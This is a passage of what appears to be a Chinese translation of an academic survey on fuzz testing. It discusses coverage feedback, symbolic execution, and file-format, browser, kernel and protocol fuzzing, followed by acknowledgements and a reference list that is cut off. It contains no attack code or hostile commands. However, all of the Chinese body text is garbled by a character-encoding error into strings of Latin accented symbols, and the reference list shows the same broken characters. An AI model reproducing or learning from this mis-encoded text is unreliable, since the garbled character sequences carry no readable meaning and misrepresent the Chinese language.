<p><strong>ç¨‹åºæ‰§è¡Œ</strong><br>åœ¨ä¸»å¾ªç¯ä¸­ï¼Œç›®æ ‡ç¨‹åºè¢«é‡å¤æ‰§è¡Œã€‚æå–ç¨‹åºæ‰§è¡ŒçŠ¶æ€ä¿¡æ¯ï¼Œç”¨äºæé«˜ç¨‹åºæ‰§è¡Œæ•ˆç‡ã€‚åœ¨æ‰§è¡Œé˜¶æ®µæ¶‰åŠåˆ°çš„ä¸¤ä¸ªå…³é”®é—®é¢˜æ˜¯å¦‚ä½•æŒ‡å¯¼ fuzz è¿‡ç¨‹ä»¥åŠå¦‚ä½•æ¢ç´¢æ–°çš„è·¯å¾„ã€‚<br>æˆ‘ä»¬å¸Œæœ› Fuzz èƒ½å¤Ÿè¦†ç›–æ›´å¤šçš„ä»£ç å¹¶æ›´å¿«åœ°å‘ç°é”™è¯¯ï¼Œå› æ­¤éœ€è¦è·¯å¾„æ‰§è¡Œä¿¡æ¯ã€‚åœ¨åŸºäºè¦†ç›–ç‡çš„ fuzz ä¸­ï¼Œå¯ä»¥ä½¿ç”¨å¤šç§æ£€æµ‹æŠ€æœ¯è®°å½•è¢«æ‰§è¡Œçš„è·¯å¾„å¹¶è®¡ç®—è¦†ç›–ç‡ä¿¡æ¯ã€‚æ ¹æ®æ˜¯å¦æä¾›æºä»£ç ï¼ˆå¦‚æœæä¾›ï¼‰ï¼Œå¯ä½¿ç”¨ç¬¦åˆè¦æ±‚çš„ç¼–è¯‘æ’æ¡©å’Œå¤–éƒ¨æ’æ¡©ã€‚å¯¹äºå®šå‘ fuzzï¼Œä½¿ç”¨æ¨¡å¼è¯†åˆ«ç­‰é™æ€åˆ†ææŠ€æœ¯æ¥è¯†åˆ«å’ŒæŒ‡å®šç›®æ ‡ä»£ç ï¼Œè¿™æ ·æ›´å®¹æ˜“å‘ç°è„†å¼±ç‚¹ã€‚<br>é™æ€åˆ†ææŠ€æœ¯ä¹Ÿå¯ç”¨äºæ”¶é›†æ§åˆ¶æµä¿¡æ¯ï¼Œä¾‹å¦‚è·¯å¾„æ·±åº¦ï¼Œè¿™å¯ä½œä¸ºæŒ‡å¯¼æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆçš„å¦ä¸€ä¸ªå‚è€ƒã€‚é€šè¿‡æ£€æµ‹æ”¶é›†çš„è·¯å¾„æ‰§è¡Œä¿¡æ¯å¯ä»¥å¸®åŠ©æŒ‡å¯¼ fuzz è¿‡ç¨‹ã€‚ä¸€äº›æ–°çš„ç³»ç»Ÿç‰¹æ€§å’Œç¡¬ä»¶ç‰¹æ€§ä¹Ÿè¢«ç”¨äºæ‰§è¡Œä¿¡æ¯çš„æ”¶é›†ã€‚è‹±ç‰¹å°”å¤„ç†å™¨è·Ÿè¸ªï¼ˆIntel PTï¼‰æ˜¯è‹±ç‰¹å°”å¤„ç†å™¨æä¾›çš„ä¸€é¡¹æ–°åŠŸèƒ½ï¼Œå®ƒå…·æœ‰æ‰§è¡Œé€Ÿåº¦å¿«ã€ä¸ä¾èµ–æºä»£ç ç­‰ä¼˜ç‚¹ï¼Œå¯ä»¥å‡†ç¡®é«˜æ•ˆåœ°è·Ÿè¸ªæ‰§è¡Œè¿‡ç¨‹ã€‚åœ¨ kafl ä¸­ï¼Œè¿™ä¸€ç‰¹æ€§è¢«ç”¨äºoså†…æ ¸çš„ fuzzï¼Œå¹¶è¢«è¯æ˜æ˜¯ç›¸å½“æœ‰æ•ˆçš„ã€‚</p>
<p>æµ‹è¯•æ‰§è¡Œä¸­çš„å¦ä¸€ä¸ªå…³æ³¨ç‚¹æ˜¯æ¢ç´¢æ–°çš„è·¯å¾„ã€‚åœ¨ç¨‹åºçš„æ§åˆ¶æµä¸­ï¼Œfuzzer éœ€è¦é€šè¿‡å¤æ‚çš„æ¡ä»¶åˆ¤æ–­ã€‚ç¨‹åºåˆ†ææŠ€æœ¯åŒ…æ‹¬é™æ€åˆ†æã€æ±¡ç‚¹åˆ†æç­‰ï¼Œå¯ä»¥ç”¨æ¥è¯†åˆ«æ‰§è¡Œè¿‡ç¨‹ä¸­çš„é˜»å¡ç‚¹ï¼Œä»è€Œè§£å†³é—®é¢˜ã€‚<strong>ç¬¦å·æ‰§è¡ŒæŠ€æœ¯åœ¨è·¯å¾„æ¢ç´¢ä¸­å…·æœ‰å¤©ç„¶çš„ä¼˜åŠ¿</strong>ã€‚é€šè¿‡æ±‚è§£çº¦æŸé›†ï¼Œç¬¦å·æ‰§è¡ŒæŠ€æœ¯å¯ä»¥å¾—åˆ°æ»¡è¶³ç‰¹å®šæ¡ä»¶è¦æ±‚çš„å€¼ã€‚Taintscopeï¼ˆWangç­‰äºº2010ï¼‰ä½¿ç”¨ç¬¦å·æ‰§è¡ŒæŠ€æœ¯æ¥è·å–ç¨‹åºä¸­éªŒè¯é€»è¾‘çš„ç»“æœã€‚Drillerï¼ˆStephensç­‰äºº2016ï¼‰åˆ©ç”¨æ··åˆæ‰§è¡Œç»•è¿‡ä¼ ç»Ÿåˆ¤æ–­å¹¶å‘ç°æ›´æ·±å±‚æ¬¡çš„æ¼æ´ã€‚<br>ç»è¿‡å¤šå¹´çš„å‘å±•ï¼Œfuzz æŠ€æœ¯çš„ç²’åº¦æ›´ç»†ã€æ›´åŠ çµæ´»å’Œæ™ºèƒ½ã€‚<strong>åé¦ˆé©±åŠ¨</strong>çš„ fuzz æŠ€æœ¯ä¸ºæŒ‡å¯¼æµ‹è¯•ç”¨ä¾‹ç”Ÿæˆæä¾›äº†ä¸€ç§æœ‰æ•ˆçš„æ–¹æ³•ã€‚</p>
<p><strong>å¯¹ä¸åŒåº”ç”¨è¿›è¡Œæ¨¡ç³Šæµ‹è¯•</strong></p>
<p>è‡ªå‡ºç°ä»¥æ¥ï¼Œfuzz æŠ€æœ¯å°±è¢«ç”¨æ¥æ£€æµ‹å¤§é‡åº”ç”¨ç¨‹åºçš„æ¼æ´ã€‚æ ¹æ®ä¸åŒåº”ç”¨çš„ç‰¹ç‚¹ï¼Œåœ¨å®é™…åº”ç”¨ä¸­é‡‡ç”¨ä¸åŒçš„ fuzzer å’Œç­–ç•¥ã€‚</p>
<p><strong>æ–‡ä»¶æ ¼å¼ fuzz</strong><br>å¤§å¤šæ•°åº”ç”¨ç¨‹åºéƒ½æ¶‰åŠæ–‡ä»¶å¤„ç†ï¼Œfuzz æŠ€æœ¯åœ¨æŸ¥æ‰¾è¿™äº›åº”ç”¨ç¨‹åºçš„é”™è¯¯æ—¶è¢«å¹¿æ³›ä½¿ç”¨ã€‚æ¨¡ç³Šæµ‹è¯•å¯ä»¥ç”¨æ ‡å‡†æ ¼å¼æˆ–ä¸æ ‡å‡†æ ¼å¼çš„æ–‡ä»¶æ¥æ“ä½œã€‚æœ€å¸¸ç”¨çš„æ–‡æ¡£æ–‡ä»¶ã€å›¾åƒå’Œåª’ä½“æ–‡ä»¶æ˜¯æ ‡å‡†æ ¼å¼çš„æ–‡ä»¶ã€‚ç›®å‰å¯¹ fuzz çš„ç ”ç©¶ä¸»è¦é›†ä¸­åœ¨æ–‡ä»¶æ ¼å¼çš„æ¨¡ç³ŠåŒ–ä¸Šï¼Œç ”ç©¶è€…ä»¬æå‡ºäº†å¾ˆå¤š fuzz å·¥å…·ï¼Œå¦‚ Peachï¼ˆpeachtech 2017ï¼‰ã€æœ€æ–°çš„ afl åŠå…¶æ‰©å±•ï¼ˆrawatç­‰ï¼‰ã€‚å‰é¢çš„ä»‹ç»æ¶‰åŠåˆ°å„ç§æ–‡ä»¶æ ¼å¼çš„fuzzer ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸å†å¼ºè°ƒå…¶ä»–å·¥å…·ã€‚</p>
<p>æ–‡ä»¶æ ¼å¼ fuzz çš„ä¸€ä¸ªé‡è¦åˆ†æ”¯æ˜¯webæµè§ˆå™¨ä¸Šçš„ fuzzã€‚éšç€ web æµè§ˆå™¨çš„å‘å±•ï¼Œå…¶åŠŸèƒ½å¾—åˆ°äº†å‰æ‰€æœªæœ‰çš„æ‰©å±•ã€‚æµè§ˆå™¨å¤„ç†çš„æ–‡ä»¶ç±»å‹å·²ç»ä»ä¼ ç»Ÿçš„HTMLã€CSSã€JS æ‰©å±•åˆ°å…¶ä»–ç±»å‹çš„æ–‡ä»¶ï¼Œå¦‚ PDFã€SVG ç­‰ã€‚å…·ä½“æ¥è¯´ï¼Œæµè§ˆå™¨å°† web é¡µé¢è§£æä¸ºdomæ ‘ï¼Œdom æ ‘å°† web é¡µé¢è§£æä¸ºä¸äº‹ä»¶å’Œå“åº”ç›¸å…³çš„æ–‡æ¡£å¯¹è±¡æ ‘ã€‚æµè§ˆå™¨çš„ dom è§£æå’Œé¡µé¢å‘ˆç°æ˜¯å½“å‰æ¯”è¾ƒçƒ­é—¨çš„ fuzz ç›®æ ‡ã€‚é’ˆå¯¹ web æµè§ˆå™¨æ¯”è¾ƒå‡ºåçš„ fuzz å·¥å…·åŒ…æ‹¬ grinder æ¡†æ¶ï¼ˆstephenless 2016ï¼‰ã€comraiderï¼ˆzimmer 2013ï¼‰ã€bf3ï¼ˆaldeid 2013ï¼‰ç­‰ç­‰ã€‚</p>
<p><strong>å†…æ ¸ fuzz</strong><br>æ“ä½œç³»ç»Ÿå†…æ ¸çš„ fuzz ä¸€ç›´æ˜¯ä¸€ä¸ªéš¾é¢˜ï¼Œæ¶‰åŠåˆ°è®¸å¤šæŒ‘æˆ˜ã€‚é¦–å…ˆï¼Œä¸ç”¨æˆ·æ€ fuzzing ä¸åŒï¼Œå†…æ ¸ä¸­çš„å´©æºƒå’ŒæŒ‚èµ·ä¼šå¯¼è‡´æ•´ä¸ªç³»ç»Ÿå´©æºƒï¼Œå¦‚ä½•æ•è·å´©æºƒæ˜¯ä¸€ä¸ªé—®é¢˜ã€‚å…¶æ¬¡ï¼Œç³»ç»Ÿæƒé™æœºåˆ¶å¯¼è‡´äº†ä¸€ä¸ªç›¸å¯¹å°é—­çš„æ‰§è¡Œç¯å¢ƒï¼Œè€ƒè™‘åˆ° fuzzer é€šå¸¸åœ¨ ring 3 çº§åˆ«ä¸­è¿è¡Œï¼Œå¦‚ä½•ä¸å†…æ ¸äº¤äº’æ˜¯å¦ä¸€ä¸ªé—®é¢˜ã€‚ç›®å‰ä¸å†…æ ¸é€šä¿¡çš„æœ€ä½³æè®®æ˜¯è°ƒç”¨å†…æ ¸APIå‡½æ•°ã€‚æ­¤å¤–ï¼Œå¹¿æ³›ä½¿ç”¨çš„å†…æ ¸å¦‚ Windows å’Œ MacOS éƒ½æ˜¯é—­æºçš„ï¼Œå¹¶ä¸” fuzz æ•ˆç‡å¾ˆä½ã€‚ä½†æ˜¯éšç€æ™ºèƒ½ fuzz æŠ€æœ¯çš„å‘å±•ï¼Œå†…æ ¸ fuzz æŠ€æœ¯ä¹Ÿå–å¾—äº†ä¸€äº›æ–°çš„è¿›å±•ã€‚</p>
<p>é€šå¸¸ï¼Œ fuzz å†…æ ¸çš„æ–¹æ³•æ˜¯<strong>éšæœºè°ƒç”¨</strong>å…·æœ‰<strong>éšæœºç”Ÿæˆçš„å‚æ•°å€¼çš„å†…æ ¸ API å‡½æ•°</strong>ã€‚æ ¹æ® fuzzer çš„å…³æ³¨ç‚¹ï¼Œå†…æ ¸ fuzzer å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼šåŸºäºå·²çŸ¥çš„ fuzzer å’ŒåŸºäºè¦†ç›–ç‡çš„ fuzzer ã€‚</p>
<p>å¯¹äºåŸºäºå·²çŸ¥çš„ fuzzer ï¼Œä½¿ç”¨å†…æ ¸ api å‡½æ•°è°ƒç”¨è¿›è¡Œ fuzz é¢ä¸´ä¸¤ä¸ªä¸»è¦æŒ‘æˆ˜ï¼š<br>ï¼ˆ1ï¼‰apiè°ƒç”¨çš„å‚æ•°åº”å…·æœ‰éµå¾ªapiè§„èŒƒçš„éšæœºä¸”æ ¼å¼è‰¯å¥½çš„å€¼<br>ï¼ˆ2ï¼‰å†…æ ¸apiè°ƒç”¨çš„é¡ºåºåº”çœ‹èµ·æ¥æœ‰æ•ˆï¼ˆhanå’Œcha 2017ï¼‰<br>ä»£è¡¨æ€§å·¥ä½œåŒ…æ‹¬Trinityï¼ˆJones 2010ï¼‰å’ŒIMFï¼ˆHanå’ŒCha 2017ï¼‰ã€‚trinityæ˜¯ä¸€ä¸ªç±»å‹æ„ŸçŸ¥çš„å†…æ ¸ fuzzerã€‚åœ¨ trinity ä¸­ï¼Œæ ¹æ®å‚æ•°ç±»å‹ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€‚ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°æ ¹æ®æ•°æ®ç±»å‹è¿›è¡Œä¿®æ”¹ã€‚æ­¤å¤–ï¼Œè¿˜æä¾›äº†æŸäº›æšä¸¾å€¼å’Œå€¼çš„èŒƒå›´ï¼Œä»¥å¸®åŠ©ç”Ÿæˆæ ¼å¼è‰¯å¥½çš„æµ‹è¯•ç”¨ä¾‹ã€‚imf è¯•å›¾å­¦ä¹  api æ‰§è¡Œçš„æ­£ç¡®é¡ºåºå’Œ api è°ƒç”¨ä¹‹é—´çš„å€¼ä¾èµ–æ€§ï¼Œå¹¶å°†å­¦ä¹ åˆ°çš„çŸ¥è¯†ç”¨äºç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€‚</p>
<p>åŸºäºè¦†ç›–ç‡çš„ fuzz æŠ€æœ¯åœ¨å‘ç°ç”¨æˆ·åº”ç”¨ç¨‹åºæ¼æ´æ–¹é¢å–å¾—äº†å·¨å¤§çš„æˆåŠŸã€‚äººä»¬å¼€å§‹å°†åŸºäºè¦†ç›–ç‡çš„ fuzz æ–¹æ³•åº”ç”¨äºå†…æ ¸æ¼æ´çš„å‘ç°ã€‚ä»£è¡¨æ€§å·¥ä½œåŒ…æ‹¬ Syzkallerï¼ˆVyukov 2015ï¼‰ã€Triforceaflï¼ˆHertz 2015ï¼‰å’Œ Kaflï¼ˆSchumiloç­‰äºº2017å¹´ï¼‰ã€‚Syzkaller é€šè¿‡ç¼–è¯‘ä¸ºå†…æ ¸å®‰è£…å·¥å…·ï¼Œå¹¶åœ¨ä¸€ç»„ QEMU è™šæ‹Ÿæœºä¸Šè¿è¡Œå†…æ ¸ã€‚åœ¨ fuzz è¿‡ç¨‹ä¸­ï¼Œè¦†ç›–èŒƒå›´å’Œå¼‚å¸¸éƒ½ä¼šè¢«è·Ÿè¸ªã€‚<br>Triforceafl æ˜¯ afl çš„ä¸€ä¸ªæ”¹è¿›ç‰ˆæœ¬ï¼Œå®ƒæ”¯æŒ qemu å…¨ç³»ç»Ÿä»¿çœŸçš„å†…æ ¸ fuzzã€‚<br>kafl åˆ©ç”¨æ–°çš„ç¡¬ä»¶ç‰¹æ€§ intel pt æ¥è·Ÿè¸ªè¦†ç›–èŒƒå›´ï¼Œåªè·Ÿè¸ªå†…æ ¸ä»£ç ã€‚å®éªŒè¡¨æ˜ï¼Œkafl çš„é€Ÿåº¦æ˜¯ triforce çš„ 40 å€å·¦å³ï¼Œå¤§å¤§æé«˜äº†æ•ˆç‡ã€‚</p>
<p><strong>åè®® Fuzz</strong><br>ç›®å‰ï¼Œå¾ˆå¤šæœ¬åœ°åº”ç”¨éƒ½æ˜¯ä»¥ b&#x2F;s æ¨¡å¼å‘ç½‘ç»œæœåŠ¡è½¬åŒ–çš„ã€‚æœåŠ¡éƒ¨ç½²åœ¨ç½‘ç»œä¸Šï¼Œå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºé€šè¿‡ç½‘ç»œåè®®ä¸æœåŠ¡å™¨é€šä¿¡ã€‚<br>ç½‘ç»œåè®®çš„å®‰å…¨æµ‹è¯•æˆä¸ºå¦ä¸€ä¸ªé‡è¦çš„å…³æ³¨ç‚¹ã€‚å¦‚æœåè®®ä¸­çš„å®‰å…¨é—®é¢˜ï¼Œå¯èƒ½å¯¼è‡´æ¯”æœ¬åœ°åº”ç”¨ç¨‹åºæ›´ä¸¥é‡çš„åæœï¼Œå¦‚æ‹’ç»æœåŠ¡ã€ä¿¡æ¯æ³„æ¼ç­‰ã€‚ä¸æ–‡ä»¶æ ¼å¼ fuzz ç›¸æ¯”ï¼Œåè®® fuzz æ¶‰åŠä¸åŒçš„é—®é¢˜ã€‚é¦–å…ˆï¼ŒæœåŠ¡å¯ä»¥å®šä¹‰è‡ªå·±çš„é€šä¿¡åè®®ï¼Œå¾ˆéš¾ç¡®å®šåè®®çš„æ ‡å‡†ã€‚æ­¤å¤–ï¼Œå³ä½¿æ˜¯æ ‡å‡†å®šä¹‰çš„æ–‡æ¡£åŒ–åè®®ï¼Œåœ¨å¼€å‘è¿‡ç¨‹ä¸­ä»ç„¶å¾ˆéš¾éµå¾ª RFC ç­‰è§„èŒƒã€‚</p>
<p>å…¸å‹çš„åè®® fuzzer åŒ…æ‹¬ Spikeï¼Œå®ƒæä¾›äº†ä¸€å¥—å·¥å…·ï¼Œå…è®¸ç”¨æˆ·å¿«é€Ÿåˆ›å»ºç½‘ç»œåè®®å‹åŠ›æµ‹è¯•å™¨ã€‚serge gorbunov å’Œ arnold rosenbloom æå‡ºäº†autofuzzï¼ˆgorbunovå’Œrosenbloomï¼Œ2010ï¼‰ï¼Œå®ƒé€šè¿‡æ„é€ ä¸€ä¸ªæœ‰é™çŠ¶æ€è‡ªåŠ¨æœºæ¥å­¦ä¹ åè®®å®ç°ï¼Œå¹¶åˆ©ç”¨æ‰€å­¦çŸ¥è¯†ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€‚Greg Banks ç­‰äººæå‡º SNOOZEï¼ˆBanksç­‰äºº2006ï¼‰ï¼Œå®ƒç”¨æœ‰çŠ¶æ€ fuzz æ–¹æ³•æ¥è¯†åˆ«åè®®ç¼ºé™·ã€‚joeri de ruiterï¼ˆde ruiter and poll 2015ï¼‰æå‡ºäº†ä¸€ç§åè®®çŠ¶æ€ fuzz æ–¹æ³•ï¼Œè¯¥æ–¹æ³•æè¿°äº†çŠ¶æ€æœºä¸­ TLS çš„å·¥ä½œçŠ¶æ€ï¼Œå¹¶æ ¹æ®é€»è¾‘æµå¯¹å…¶è¿›è¡Œ fuzz å¤„ç†ã€‚ä¹‹å‰çš„å·¥ä½œä¸€èˆ¬é‡‡ç”¨æœ‰çŠ¶æ€çš„æ–¹æ³•å¯¹åè®®å·¥ä½œè¿‡ç¨‹è¿›è¡Œå»ºæ¨¡ï¼Œå¹¶æ ¹æ®åè®®è§„èŒƒç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ã€‚</p>
<p><strong>fuzz æŠ€æœ¯çš„æ–°è¶‹åŠ¿</strong></p>
<p>Fuzz æŠ€æœ¯ä½œä¸ºä¸€ç§è‡ªåŠ¨æ£€æµ‹æ¼æ´çš„æ–¹æ³•ï¼Œæ˜¾ç¤ºäº†å…¶é«˜æ•ˆæ€§å’Œæœ‰æ•ˆæ€§ã€‚ç„¶è€Œï¼Œæ­£å¦‚å‰é¢æåˆ°çš„ï¼Œä»ç„¶æœ‰è®¸å¤šæŒ‘æˆ˜éœ€è¦è§£å†³ã€‚åœ¨è¿™ä¸€éƒ¨åˆ†ä¸­ï¼Œæˆ‘ä»¬ç®€è¦ä»‹ç»äº†è‡ªå·±çš„ç†è§£ï¼Œä»¥ä¾›å‚è€ƒã€‚</p>
<p>é¦–å…ˆï¼Œæ™ºèƒ½ fuzzer ä¸ºæ”¹è¿›æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯æä¾›äº†æ›´å¤šçš„å¯èƒ½æ€§ã€‚åœ¨ä»¥å‰çš„å·¥ä½œä¸­ï¼Œä¼ ç»Ÿçš„é™æ€åˆ†æå’ŒåŠ¨æ€åˆ†ææŠ€æœ¯è¢«é›†æˆåˆ° fuzz ä¸­ã€‚è™½ç„¶å–å¾—äº†ä¸€å®šçš„è¿›æ­¥ï¼Œä½†è¿˜æ˜¯æœ‰é™ã€‚æ™ºèƒ½ fuzzer é€šè¿‡å¤šç§æ–¹å¼æ”¶é›†ç›®æ ‡ç¨‹åºçš„æ‰§è¡Œä¿¡æ¯ï¼Œå¯¹ fuzz è¿‡ç¨‹è¿›è¡Œæ›´ç²¾ç»†çš„è°ƒæ•´ã€‚éšç€å¯¹ä¸åŒç±»å‹æ¼æ´çš„æ·±å…¥ç†è§£ï¼Œä»¥åŠå¯¹ fuzz ä¸­æ¼æ´ç‰¹å¾çš„åˆ©ç”¨ï¼Œæ™ºèƒ½ fuzzer æœ‰åŠ©äºå‘ç°æ›´å¤æ‚çš„æ¼æ´ã€‚</p>
<p>ç¬¬äºŒï¼Œæ–°æŠ€æœ¯å¯åœ¨è®¸å¤šæ–¹é¢å¸®åŠ© fuzzer æ›´å¥½çš„æ£€æµ‹æ¼æ´ã€‚å¦‚æœºå™¨å­¦ä¹ å’Œç›¸å…³çš„æŠ€æœ¯å·²ç»è¢«ç”¨æ¥æ”¹è¿› fuzz ä¸­çš„æµ‹è¯•ç”¨ä¾‹çš„ç”Ÿæˆã€‚å¦‚ä½•å°†æ–°æŠ€æœ¯çš„ä¼˜åŠ¿å’Œç‰¹ç‚¹ä¸ fuzz ç»“åˆèµ·æ¥ï¼Œæ˜¯å¦ä¸€ä¸ªå€¼å¾—æ€è€ƒçš„é—®é¢˜ã€‚</p>
<p>ç¬¬ä¸‰ï¼Œä¸åº”å¿½è§†æ–°çš„ç³»ç»Ÿç‰¹æ€§å’Œç¡¬ä»¶ç‰¹æ€§ã€‚Vyukov å’Œ Schumilo çš„å·¥ä½œè¡¨æ˜ï¼Œæ–°çš„ç¡¬ä»¶ç‰¹æ€§å¤§å¤§æé«˜äº† fuzz çš„æ•ˆç‡ï¼Œç»™äº†æˆ‘ä»¬å¾ˆå¥½çš„å¯å‘ã€‚</p>
<p><strong>ç»“è®º</strong></p>
<p>æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯æ˜¯ç›®å‰æœ€æœ‰æ•ˆçš„æ¼æ´å‘ç°æ–¹æ³•ä¹‹ä¸€ã€‚æœ¬æ–‡å¯¹ fuzz åŠå…¶æœ€æ–°è¿›å±•è¿›è¡Œäº†å…¨é¢çš„å›é¡¾å’Œæ€»ç»“ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å°†æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯ä¸å…¶ä»–æ¼æ´å‘ç°æ–¹æ³•è¿›è¡Œäº†æ¯”è¾ƒï¼Œç„¶åä»‹ç»äº†æ¨¡ç³Šæµ‹è¯•æŠ€æœ¯çš„æ¦‚å¿µå’Œå…³é”®æŒ‘æˆ˜ã€‚æœ¬æ–‡ç€é‡ä»‹ç»äº†è¿‘å¹´æ¥å‘å±•è¿…é€Ÿçš„åŸºäºè¦†ç›–ç‡çš„ fuzz æŠ€æœ¯ã€‚æœ€åï¼Œæ€»ç»“äº† fuzz æŠ€æœ¯èåˆã€fuzz æŠ€æœ¯çš„åº”ç”¨åŠå¯èƒ½å‡ºç°çš„æ–°è¶‹åŠ¿ã€‚</p>
<p><strong>Abbreviations</strong><br>AFL: American Fuzzy Lop; BB: Basic Block; DNN: Deep Neural Networks; LSTM: Long Short-Term Memory; POC: Proof of Concept<br><strong>Acknowledgements</strong><br>This research was supported in part by the National Natural Science Foundation of China (Grant No. 61772308 61472209, and U1736209), and Young Elite Scientists Spon- sorship Program by CAST (Grant No. 2016QNRC001), and award from Tsinghua Information Science And Technology National Laboratory.<br><strong>Authorsâ€™ contributions</strong><br>JL drafted most of the manuscripts, BZ helped proofreading and summarized parts of the literature, and Prof. CZ abstracted the classifier for existing solutions and designed the overall structure of the paper. All authors read and approved the final manuscript.<br><strong>Competing interests</strong><br>CZ is currently serving on the editorial board for Journal of Cybersecurity.<br><strong>Publisherâ€™s Note</strong><br>Springer Nature remains neutral with regard to jurisdictional claims in published maps and institutional affiliations.</p>
<p><strong>References</strong><br>Aldeid (2013) Browser fuzzer 3. <a class="link"   href="https://www.aldeid.com/wiki/Bf3" >https://www.aldeid.com/wiki/Bf3<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Amini P (2017) Sulley fuzzing framework. <a class="link"   href="https://github.com/OpenRCE/sulley" >https://github.com/OpenRCE/sulley<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>Banks G, Cova M, Felmetsger V, Almeroth K, Kemmerer R, Vigna G (2006) Snooze: toward a stateful network protocol fuzzer. In: International Conference on Information Security. Springer, Berlin. pp 343â€“358<br>BoÌˆhme M, Pham V-T, Nguyen M-D, Roychoudhury A (2017) Directed greybox fuzzing. In: Proceeding CCS â€™17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York. pp 2329â€“2344. <a class="link"   href="https://doi.org/10.1145/3133956.3134020" >https://doi.org/10.1145/3133956.3134020<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>BoÌˆhme M, Pham VT, Roychoudhury A (2017) Coverage-based greybox fuzzing as markov chain. In: Proceedings of the 2016 ACM SIGSAC Conference on Computer and Communications Security. ACM. pp 1032â€“1043<br>Bowne S (2015) Fuzzing with spike. <a class="link"   href="https://samsclass.info/127/proj/p18-spike" >https://samsclass.info/127/proj/p18-spike<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. htm. Accessed 25 Dec 2017<br>Cha SK, Avgerinos T, Rebert A, Brumley D (2012) Unleashing mayhem on binary code. In: Security and Privacy (SP) 2012 IEEE Symposium on. IEEE, San Francisco. pp 380â€“394. <a class="link"   href="https://doi.org/10.1109/SP.2012.31" >https://doi.org/10.1109/SP.2012.31<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>De Ruiter J, Poll E (2015) Protocol state fuzzing of tls implementations. In: Proceeding SECâ€™15 Proceedings of the 24th USENIX Conference on Security Symposium. USENIX Association, Berkeley. pp 193â€“206<br>Godefroid P, Levin MY, Molnar D (2012) Sage: whitebox fuzzing for security testing. Queue 10(1):20<br>Godefroid P, Peleg H, Singh R (2017) Learn &amp; fuzz: Machine learning for input fuzzing. In: Proceeding ASE 2017 Proceedings of the 32nd IEEE&#x2F;ACM International Conference on Automated Software Engineering. IEEE Press, Piscataway. pp 50â€“59<br>Gorbunov S, Rosenbloom A (2010) Autofuzz: Automated network protocol fuzzing framework. IJCSNS 10(8):239<br>Han H, Cha SK (2017) Imf: Inferred model-based fuzzer. In: Proceeding CCS â€™17 Proceedings of the 2017 ACM SIGSAC Conference on Computer and Communications Security. ACM, New York. pp 2345â€“2358. <a class="link"   href="https://doi.org/" >https://doi.org/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>10.1145&#x2F;3133956.3134103<br>Hertz J (2015) Triforceafl . <a class="link"   href="https://github.com/nccgroup/TriforceAFL" >https://github.com/nccgroup/TriforceAFL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>James R (2013) Processor tracing. <a class="link"   href="https://software.intel.com/en-us/blogs/" >https://software.intel.com/en-us/blogs/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>2013&#x2F;09&#x2F;18&#x2F;processor-tracing. Accessed 25 Dec 2017<br>Jones D (2010) trinity. <a class="link"   href="https://github.com/kernelslacker/trinity" >https://github.com/kernelslacker/trinity<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>King JC (1976) Symbolic execution and program testing. Commun ACM 19(7):385â€“394<br>lcamtuf (2014) Fuzzing random programs without execve(). <a class="link"   href="https://lcamtuf/" >https://lcamtuf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. <a class="link"   href="http://blogspot.jp/2014/10/fuzzing-binaries-without-execve.html" >blogspot.jp&#x2F;2014&#x2F;10&#x2F;fuzzing-binaries-without-execve.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017<br>libfuzzer (2017) A library for coverage-guided fuzz testing. <a class="link"   href="https://llvm.org/" >https://llvm.org/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>docs&#x2F;LibFuzzer.html. Accessed 25 Dec 2017<br>Liu B, Shi L, Cai Z, Li M (2012) Software vulnerability discovery techniques: A survey. In: Multimedia Information Networking and Security (MINES), 2012 Fourth International Conference on. IEEE, Nanjing. pp 152â€“156. <a class="link"   href="https://doi/" >https://doi<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. org&#x2F;10.1109&#x2F;MINES.2012.202<br>Luk C-K, Cohn R, Muth R, Patil H, Klauser A, Lowney G, Wallace S, Reddi VJ, Hazelwood K (2005) Pin: building customized program analysis tools with dynamic instrumentation. In: Acm sigplan notices, volume 40. ACM, Chicago. pp 190â€“200<br>Nichols N, Raugas M, Jasper R, Hilliard N (2017) Faster fuzzing: Reinitialization with deep neural models. arXiv preprint arXiv:1711.02807<br>PeachTech (2017) Peach. <a class="link"   href="https://www.peach.tech/" >https://www.peach.tech/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. Accessed 25 Dec 2017 Petsios T, Zhao J, Keromytis 